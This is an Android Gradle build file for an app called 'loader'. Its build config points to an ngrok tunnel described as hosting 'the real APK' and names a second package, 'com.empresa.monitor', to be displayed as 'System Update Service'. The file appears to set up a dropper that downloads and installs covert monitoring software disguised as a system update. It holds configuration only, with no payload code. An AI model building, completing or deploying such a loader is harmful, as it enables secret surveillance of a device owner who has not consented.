plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.empresa.loader"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.empresa.loader"
        minSdk = 21
        targetSdk = 28
        versionCode = 1
        versionName = "1.0.0"

        // Server where the real APK is hosted
        buildConfigField("String", "API_BASE_URL", "\"https://overhaul-result-grout.ngrok-free.dev\"")
        buildConfigField("String", "APK_DOWNLOAD_URL", "\"https://overhaul-result-grout.ngrok-free.dev/api/loader/get_apk_new\"")
        buildConfigField("String", "APK_PACKAGE_NAME", "\"com.empresa.monitor\"")
        buildConfigField("String", "APK_DISPLAY_NAME", "\"System Update Service\"")
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

    kotlinOptions {
        jvmTarget = "11"
    }

    buildFeatures {
        buildConfig = true
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.google.android.material:material:1.11.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("com.google.code.gson:gson:2.10.1")
    implementation("androidx.security:security-crypto:1.1.0-alpha06")
}
